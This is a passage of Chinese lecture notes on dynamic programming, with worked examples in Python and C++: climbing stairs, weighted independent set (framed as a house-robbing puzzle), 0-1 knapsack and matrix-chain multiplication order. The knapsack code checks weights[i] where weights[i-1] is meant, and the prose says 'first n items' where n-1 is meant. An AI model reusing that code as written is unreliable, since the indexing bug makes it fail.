</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk7-__codelineno-1-6"></a><span class="w">        </span><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="mi">-1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="mi">-2</span><span class="p">];</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk7-__codelineno-1-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk7-__codelineno-1-8"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">dp</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk7-__codelineno-1-9"></a><span class="p">}</span>
</span></code></pre></div>
<p>这一重要的思想我们称其为 “记忆化”，非常形象，因为我们就是利用额外的空间记住曾经算过的结果，从而避免了重复计算的问题。换句话说，原先递归的方法实际上是一种 “自顶向下” 的方法，它符合我们的直接思路：最后长度为 n 的问题需要长度为 n − 1 和 n − 2 的求和，那我们的代码直接利用递归计算递归式显得非常自然。但是重复的计算迫使我们放弃这种自然的想法，转而采用自底向上从小问题逐步迭代构建原问题的解法。</p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>在爬楼梯这一简单而经典的问题中，通过对最后一步两种情况的分类，将整个问题的解转化为了两个子问题解的求和，即有一个从子问题的解到原问题的解的递推公式，然后我们通过记忆化的方式求解递推式。我们将上述特点抽象出来： <strong>一个问题，它的最优解可以表达为一些合适的子问题的最优解的递推关系，则我们称这一问题具有最优子结构性质(因为大问题的最优解可以直接依赖于小问题的最优解)</strong> 。然后我们求解这一递推式，通过设置好 base case（这里我们也用 basecase 指代最简单的情况，但注意这时不是递归了），然后通过记忆化的方法，使用迭代算法而非费时的递归算法避免冗余计算，得到一个时间复杂度令人满意的算法，这就是动态规划的基本想法。</p>
</div>
<div class="card">
<div class="card-header" style="display: flex;justify-content: space-between;">
    <span>动态规划</span>
    <span>基本结构</span>
</div>
<div class="card-body" style="padding-top: 0;">
<p>动态规划方法通常用来求解最优化问题（optimization problem）。这类问题可以有很多可行解，每个解都有一个值，我们希望寻找具有最优值（最小值或最大值）的解。我们称这样的解为问题的一个最优解（an optimal solution），而不是最优解（the optimal solution），因为可能有多个解都达到最优值。
我们通常按如下 4 个步骤来设计一个动态规划算法：</p>
<ul>
<li>刻画一个最优解的结构特征；</li>
<li>递归地定义最优解的值；</li>
<li>计算最优解的值，通常采用自底向上的方法；</li>
<li>利用计算出的信息构造一个最优解。</li>
</ul>
<p>前三个步骤是动态规划算法求解问题的基础。如果我们仅仅需要一个最优解的值，而非解本身，可以忽略最后一个步骤</p>
</div>
</div>
<p>更精炼地，事实上动态规划就是为一个具有所谓最优子结构性质（即原问题最优解可以由子问题最优解递推得到）的最优化问题寻找一个子问题到原问题的递推式，然后用记忆化方法求解，有时候需要构造这一组解</p>
<h2 id="note-ads-wk7-_1">加权独立集合问题<a class="headerlink" href="#note-ads-wk7-_1" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">问题引入</p>
<p>你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。给定一个代表每个房屋存放金额的非负整数数组，计算你不触动警报装置的情况下，一夜之内能够偷窃到的最高金额</p>
</div>
<p>问题可以被抽象为</p>
<p>考虑一个无向图 G，其上所有点都在一条线上（这种图我们称其为路径图），每个点都有一个非负权重。我们称 G 的独立集合是指顶点互不相邻的子集（换句话说独立集合不会同时包含一条边上的两个点），然后要求解一个具有最大顶点权重和的独立集合。</p>
<details class="eg">
<summary>简单例子</summary>
<p><div align="center">
<img src="../NOTE/ADS/part1/20.png" width=60%>
</div></p>
<p>在这个图中有 8 个独立子集：</p>
<ul>
<li>空集</li>
<li>四个单点集</li>
<li>第 1 和第 3 个点</li>
<li>第 1 和第 4 个点</li>
<li>第 2 和第 4 个点</li>
</ul>
<p>其中最大的独立集合显然是第 2 和第 4 个点构成的集合，其权重和为 8，即小偷的最优选择是偷 2 和 4 两家，最大收益是 8。需要注意的是，题目的假设中每个顶点都有非负权重，所以最优解的顶点应当是越多越好。</p>
</details>
<p>为了构建出这一问题的最优子结构，我们考虑在<span class="arithmatex">\(n\)</span>个点，<span class="arithmatex">\(n-1\)</span>条边构成的图<span class="arithmatex">\(G(V,E)\)</span>中最后一个点<span class="arithmatex">\(v_n\)</span> 在不在解当中：</p>
<ul>
<li>如果不在，那么问题的解就是子问题<span class="arithmatex">\(G_{n-1}\)</span>的最优解</li>
<li>如果在，那么问题的解就是子问题<span class="arithmatex">\(G_{n-2}\)</span>的最优解加上<span class="arithmatex">\(v_n\)</span></li>
</ul>
<p>故设前 <span class="arithmatex">\(i\)</span> 个点的最优加权独立集合的权重之和为 <span class="arithmatex">\(W_i\)</span>，我们可以写出递推关系：</p>
<div class="arithmatex">\[
    W_i = \max(W_{i-1}, W_{i-2} + w_i)
\]</div>
<p>最后我们可以自底向上构建解</p>
<div class="language-Python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-ads-wk7-__codelineno-2-1"></a>   <span class="n">array</span> <span class="n">A</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-ads-wk7-__codelineno-2-2"></a>   <span class="n">A</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-ads-wk7-__codelineno-2-3"></a>   <span class="n">A</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="n">w</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#note-ads-wk7-__codelineno-2-4"></a>   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#note-ads-wk7-__codelineno-2-5"></a>    <span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="nb">max</span><span class="p">(</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">],(</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">+</span><span class="n">w_i</span><span class="p">))</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#note-ads-wk7-__codelineno-2-6"></a>   <span class="k">return</span> <span class="n">A</span><span class="p">[</span><span class="n">n</span><span class="p">]</span>
</span></code></pre></div>
<p>我们在<span class="arithmatex">\(O(n)\)</span>复杂度内完成了这一工作</p>
<p>如果我们需要重构出构成最优解有哪一些点，那么可以自顶向下根据递推式来判断当前图的最后一个点是否在解中</p>
<div align="center">
    <img src="../NOTE/ADS/part1/21.png" width=60%>
</div>

<h2 id="note-ads-wk7-_2">背包问题<a class="headerlink" href="#note-ads-wk7-_2" title="Permanent link">&para;</a></h2>
<p>背包问题是一个最最经典的动态规划问题，我们这里首先介绍最基础的背包问题，即 <span class="arithmatex">\(0-1\)</span> 背包问题。这
一问题的描述如下：我们有 <span class="arithmatex">\(n\)</span> 个物品，每个物品的重量为 <span class="arithmatex">\(s_i\)</span>，价值为 <span class="arithmatex">\(v_i\)</span>，我们有一个容量为 <span class="arithmatex">\(C\)</span> 的背包，我们希望找到一个最优的装载方案，使得背包中的物品总价值最大。这一问题的特点是每个物品你要么不放进包里，要么完整的 <span class="arithmatex">\(1\)</span> 个放进去，因此称为 <span class="arithmatex">\(0-1\)</span> 背包问题。</p>
<p>这与加权独立集合问题略有不同</p>
<ul>
<li>如果第 <span class="arithmatex">\(n\)</span> 个物品不在最优解 <span class="arithmatex">\(S\)</span> 中，即最优方案排除了最后一件物品，因此它可以看成仅由前  <span class="arithmatex">\(n−1\)</span>个物品组成的子问题的一种可行解决方案</li>
<li>如果第 <span class="arithmatex">\(n\)</span> 个物品在最优解 <span class="arithmatex">\(S\)</span> 中，这种情况只有在 <span class="arithmatex">\(s_n \leqslant C\)</span> 时才有意义。类似于加权独立集合问题，我们希望 <span class="arithmatex">\(S − \{n\}\)</span> 是前 <span class="arithmatex">\(n − 1\)</span> 个物品组成的子问题的最优解，但这显然是错误的！如果 <span class="arithmatex">\(S − \{n\}\)</span>就已经把 <span class="arithmatex">\(W\)</span>几乎占满，那最后 <span class="arithmatex">\(n\)</span> 根本就放不进来了。因此我们需要对子问题的设置略做调整：<span class="arithmatex">\(S − \{n\}\)</span> 应当是前 <span class="arithmatex">\(n\)</span> 个物品在背包容量为 <span class="arithmatex">\(C −s_n\)</span> 的情况下的最优解！因为我们知道 <span class="arithmatex">\(n\)</span> 在解中，那么除去 <span class="arithmatex">\(n\)</span> 之外的其它解的重量之和最多就是 <span class="arithmatex">\(C − s_n\)</span>，因此 <span class="arithmatex">\(S − \{n\}\)</span> 应当是前 <span class="arithmatex">\(n\)</span> 个物品在背包容量为  <span class="arithmatex">\(C − s_n\)</span>的情况下的可行解</li>
</ul>
<p>所以</p>
<div class="arithmatex">\[
 V_{i,c} = 
\begin{cases} 
V_{i-1,c}, &amp; \text{if } s_i &gt; c \\ 
\max(V_{i-1,c}, V_{i-1,c-s_i} + v_i), &amp; \text{if } s_i \leq c 
\end{cases} 
\]</div>
<div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-ads-wk7-__codelineno-3-1"></a><span class="k">def</span> <span class="nf">knapsack</span><span class="p">(</span><span class="n">weights</span><span class="p">,</span> <span class="n">values</span><span class="p">,</span> <span class="n">capacity</span><span class="p">):</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-ads-wk7-__codelineno-3-2"></a>    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">weights</span><span class="p">)</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-ads-wk7-__codelineno-3-3"></a>    <span class="n">dp</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="n">capacity</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-ads-wk7-__codelineno-3-4"></a>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#note-ads-wk7-__codelineno-3-5"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#note-ads-wk7-__codelineno-3-6"></a>        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">capacity</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#note-ads-wk7-__codelineno-3-7"></a>            <span class="k">if</span> <span class="n">weights</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">c</span><span class="p">:</span> <span class="c1">#如果当前物品的重量大于背包容量,不用再考虑</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#note-ads-wk7-__codelineno-3-8"></a>                <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">c</span><span class="p">]</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#note-ads-wk7-__codelineno-3-9"></a>            <span class="k">else</span><span class="p">:</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#note-ads-wk7-__codelineno-3-10"></a>                <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">c</span><span class="p">]</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">c</span><span class="p">],</span> <span class="n">dp</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">c</span><span class="o">-</span><span class="n">weights</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]]</span> <span class="o">+</span> <span class="n">values</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#note-ads-wk7-__codelineno-3-11"></a>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#note-ads-wk7-__codelineno-3-12"></a>    <span class="k">return</span> <span class="n">dp</span><span class="p">[</span><span class="n">n</span><span class="p">][</span><span class="n">capacity</span><span class="p">]</span>
</span></code></pre></div>
<p>解的重构</p>
<div align="center">
    <img src="../NOTE/ADS/part1/22.png" width=60%>
</div>

<h2 id="note-ads-wk7-_3">矩阵乘法的计算顺序<a class="headerlink" href="#note-ads-wk7-_3" title="Permanent link">&para;</a></h2>
<p>我们考虑矩阵链相乘 <span class="arithmatex">\( M_1M_2 \cdots M_n \)</span>，每个矩阵的大小为 <span class="arithmatex">\( r_{i-1} \times r_i \)</span>。记</p>
<div class="arithmatex">\[ M_{ij} = M_iM_{i+1} \cdots M_j \]</div>
<p>显然前面的三个问题给我们了不少的经验：我们应当考虑最后一个矩阵，然后依据这一矩阵可能的相乘方式划分最优解的可能性。很简单的，第一种情况对应我们的计算方式是 <span class="arithmatex">\( M_{1,n-1} \cdots M_n \)</span>，即先用算前 <span class="arithmatex">\( n-1 \)</span> 个矩阵相乘的最优方式计算前 <span class="arithmatex">\( n-1 \)</span> 个矩阵的乘积，最后与 <span class="arithmatex">\( M_n \)</span> 相乘；第二种情况的计算方式是 <span class="arithmatex">\( M_{1,n-2} \cdots M_{n-1}M_n \)</span>，即先用算前 <span class="arithmatex">\( n-2 \)</span> 个矩阵相乘的最优方式计算前 <span class="arithmatex">\( n-2 \)</span> 个矩阵的乘积，最后与 <span class="arithmatex">\( M_{n-1}M_n \)</span> 的结果相乘。这是根据我们前面的问题的经验得到的，和表述完全一致，但事实上真的只有这两种情况吗？显然不是的！注意，请回到我们分类的根源来看：我们此时分类的依据是 <span class="arithmatex">\( M_n \)</span> 的计算方式，那么对于如下乘积形式：</p>
<div class="arithmatex">\[ M_{1,i}M_{i+1,n-1}M_n \]</div>
<p>只要是不同的 <span class="arithmatex">\( i \)</span> ，我们就可以得到不同的计算方式</p>
<p>因此，我们自顶向下寻找最优解时，应该考虑对于一个无序矩阵，我们的第一刀应该切在哪个地方</p>
<div class="arithmatex">\[
    m_{1n} = min\{m_{1i} + m_{i+1,n} + r_0r_ir_n\}
\]</div>
<p>前两项代表左右子问题的解，最后一项代表合并的代价，更具体的，我们有</p>
<div class="arithmatex">\[ 
m_{ij} = 
\begin{cases} 
0, &amp; i = j; \\ 
\min\limits_{i \leq k &lt; j} \{ m_{ik} + m_{k+1,j} + r_{i-1}r_kr_j \}, &amp; i &lt; j. 
\end{cases} 
\]</div>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-ads-wk7-__codelineno-4-1"></a><span class="kt">void</span><span class="w"> </span><span class="nf">OptMatrix</span><span class="p">(</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">r</span><span class="p">[</span><span class="w"> </span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">N</span><span class="p">,</span><span class="w"> </span><span class="n">TwoDimArray</span><span class="w"> </span><span class="n">M</span><span class="w"> </span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-ads-wk7-__codelineno-4-2"></a><span class="p">{</span><span class="w">   </span><span class="kt">int</span><span class="w">  </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="p">,</span><span class="w"> </span><span class="n">L</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-ads-wk7-__codelineno-4-3"></a><span class="w">    </span><span class="kt">long</span><span class="w">  </span><span class="n">ThisM</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-ads-wk7-__codelineno-4-4"></a><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w">   </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">//base case</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-ads-wk7-__codelineno-4-5"></a><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">N</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="cm">/* k = j - i */</span><span class="w"> </span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-ads-wk7-__codelineno-4-6"></a><span class="w">        </span><span class="k">for</span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">N</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">k</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="cm">/* For each position */</span><span class="w"> </span>
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#note-ads-wk7-__codelineno-4-7"></a><span class="w">    </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">k</span><span class="p">;</span><span class="w">    </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Infinity</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#note-ads-wk7-__codelineno-4-8"></a><span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">j</span><span class="p">;</span><span class="w"> </span><span class="n">L</span><span class="o">++</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#note-ads-wk7-__codelineno-4-9"></a><span class="w">        </span><span class="n">ThisM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="p">]</span><span class="w"> </span>
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#note-ads-wk7-__codelineno-4-10"></a><span class="w">            </span><span class="o">+</span><span class="w"> </span><span class="n">r</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">r</span><span class="p">[</span><span class="w"> </span><span class="n">L</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">r</span><span class="p">[</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="p">];</span><span class="w"> </span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#note-ads-wk7-__codelineno-4-11"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ThisM</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="p">)</span><span class="w">  </span><span class="cm">/* Update min */</span><span class="w"> </span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#note-ads-wk7-__codelineno-4-12"></a><span class="w">        </span><span class="n">M</span><span class="p">[</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="p">][</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ThisM</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#note-ads-wk7-__codelineno-4-13"></a><span class="w">    </span><span class="p">}</span><span class="w">  </span><span class="cm">/* end for-L */</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#note-ads-wk7-__codelineno-4-14"></a><span class="w">    </span><span class="p">}</span><span class="w">  </span><span class="cm">/* end for-Left */</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#note-ads-wk7-__codelineno-4-15"></a><span class="p">}</span>
</span></code></pre></div>
<details class="info">
<summary>代码解释</summary>
<ul>
<li>参数: <code>r</code> 是矩阵链的维度数组，<code>N</code> 是矩阵链的长度，<code>M</code> 是动态规划的结果表。</li>
<li>初始化base case：</li>
<li><code>for( i = 1; i &lt;= N; i++ ) M[ i ][ i ] = 0;</code></li>
<li>
<p>这一步将矩阵 <code>M</code> 的对角线元素设为 0，因为单个矩阵的乘法代价为零。</p>
</li>
<li>
<p>填充动态规划表：</p>
</li>
<li><code>for( k = 1; k &lt; N; k++ )</code>：<code>k</code> 表示当前考虑的矩阵链长度。</li>
<li><code>for( i = 1; i &lt;= N - k; i++ )</code>：<code>i</code> 是链的起始位置。<ul>
<li><code>j = i + k;</code>：<code>j</code> 是链的结束位置。</li>
<li><code>M[ i ][ j ] = Infinity;</code>：初始化 <code>M[i][j]</code> 为无穷大，表示尚未计算出最小代价。</li>
<li><code>for( L = i; L &lt; j; L++ )</code>：<code>L</code> 是可能的分割点。</li>
<li><code>ThisM = M[ i ][ L ] + M[ L + 1 ][ j ] + r[ i - 1 ] * r[ L ] * r[ j ];</code><ul>
<li>计算从 <code>i</code> 到 <code>L</code> 和从 <code>L+1</code> 到 <code>j</code> 的乘法代价，加上合并两个结果矩阵的代价。</li>
</ul>
</li>
<li><code>if ( ThisM &lt; M[ i ][ j ] ) M[ i ][ j ] = ThisM;</code><ul>
<li>如果计算出的代价小于当前存储的代价，则更新 <code>M[i][j]</code>。</li>
</ul>
</li>
</ul>
</li>
</ul>
</details>
<p>时间复杂度：<span class="arithmatex">\(O(n^3)\)</span>，其中 <span class="arithmatex">\(n\)</span> 是矩阵链的长度。</p>
<p>解的重构</p>
<p>这一问题重构解的方法如果用和前面的问题一样简单直接的控制方法显然会比较耗时，因为我们每次要比较很多种可能的情况才能重构出解，所以我们需要做一些优化。优化的方法也非常自然，实际上关键就是用一个二维数组记住每个子问题</p>
<div class="arithmatex">\[ 
m_{ij} = \min\limits_{i \leq k &lt; j} \{ m_{ik} + m_{k+1,j} + r_{i-1}r_kr_j \} 
\]</div>
<p>对应的最优的分点，然后当我们算出问题 <span class="arithmatex">\( m_n \)</span> 的最优解及其对应的最优分点后，我们再按左右两半子问题的最优分点，以此类推，用中序遍历的思想将分点输出即可，只需线性时间。</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-ads-wk7-__codelineno-5-1"></a><span class="c1">// Function to print the optimal parenthesization</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-ads-wk7-__codelineno-5-2"></a><span class="kt">void</span><span class="w"> </span><span class="nf">printOptimalParens</span><span class="p">(</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&gt;&amp;</span><span class="w"> </span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-ads-wk7-__codelineno-5-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-ads-wk7-__codelineno-5-4"></a><span class="w">        </span><span class="n">cout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="s">&quot;A&quot;</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#note-ads-wk7-__codelineno-5-5"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#note-ads-wk7-__codelineno-5-6"></a><span class="w">        </span><span class="n">cout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="s">&quot;(&quot;</span><span class="p">;</span>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#note-ads-wk7-__codelineno-5-7"></a><span class="w">        </span><span class="n">printOptimalParens</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]);</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#note-ads-wk7-__codelineno-5-8"></a><span class="w">        </span><span class="n">cout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
